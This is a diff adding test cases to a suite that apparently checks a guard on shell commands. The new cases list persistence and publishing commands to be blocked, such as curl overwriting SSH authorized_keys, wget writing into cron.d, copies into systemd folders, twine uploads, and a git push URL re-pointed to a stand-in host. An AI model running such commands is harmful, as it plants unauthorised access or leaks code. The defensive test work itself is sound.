@@ -208,3 +208,25 @@ suite:
      expect: "The guard refuses it; anywhere in the command.", execute: {command: "ls ~/.local/share/gh-token-monitor", expect: block}}
   - {id: tc-098, category: negative_trigger, prompt: "A request lists the working directory.",
      expect: "The guard allows it; nothing to refuse.", execute: {command: "ls -la", expect: allow}}
+  - {id: tc-099, category: trigger, prompt: "A request saves a download over the ssh login keys with clustered curl flags.",
+     expect: "The guard refuses it; the output flag is read inside the cluster.", execute: {command: "curl -sSLo ~/.ssh/authorized_keys https://x.example/k", expect: block}}
+  - {id: tc-100, category: adversarial, prompt: "A request saves a download into the cron folder with clustered wget flags.",
+     expect: "The guard refuses it; -qO is -q and -O.", execute: {command: "wget -qO/etc/cron.d/x https://x.example/k", expect: block}}
+  - {id: tc-101, category: adversarial, prompt: "A request copies a unit into the user systemd folder by target directory.",
+     expect: "The guard refuses it; -t names the folder written.", execute: {command: "cp -t ~/.config/systemd/user x.service", expect: block}}
+  - {id: tc-102, category: adversarial, prompt: "A request installs a file into the cron folder by target directory.",
+     expect: "The guard refuses it; the combined flags are read.", execute: {command: "install -Dt /etc/cron.d x", expect: block}}
+  - {id: tc-103, category: adversarial, prompt: "A request publishes through the glued python module flag.",
+     expect: "The guard refuses it; -mtwine is -m twine.", execute: {command: "python -mtwine upload dist/*", expect: block}}
+  - {id: tc-104, category: adversarial, prompt: "A request publishes through the Windows python launcher.",
+     expect: "The guard refuses it; py is a python launcher.", execute: {command: "py -m twine upload dist/*", expect: block}}
+  - {id: tc-105, category: adversarial, prompt: "A request publishes a yarn workspace whose name is also a yarn command.",
+     expect: "The guard refuses it; the workspace name is skipped.", execute: {command: "yarn workspace test publish", expect: block}}
+  - {id: tc-106, category: adversarial, prompt: "A request points later pushes at another host through git config.",
+     expect: "The guard asks; a remote url is re-pointed.", execute: {command: "git config remote.origin.pushurl https://x.example/r.git", expect: ask}}
+  - {id: tc-107, category: negative_trigger, prompt: "A request downloads to the standard output.",
+     expect: "The guard allows it; no path is written.", execute: {command: "wget -qO- https://x.example/k", expect: allow}}
+  - {id: tc-108, category: negative_trigger, prompt: "A request copies a file into a temporary folder by target directory.",
+     expect: "The guard allows it; the folder is not a persistence location.", execute: {command: "cp -t /tmp x", expect: allow}}
+  - {id: tc-109, category: negative_trigger, prompt: "A request reads a remote url from git config.",
+     expect: "The guard allows it; only a set value re-points a push.", execute: {command: "git config --get remote.origin.url", expect: allow}}
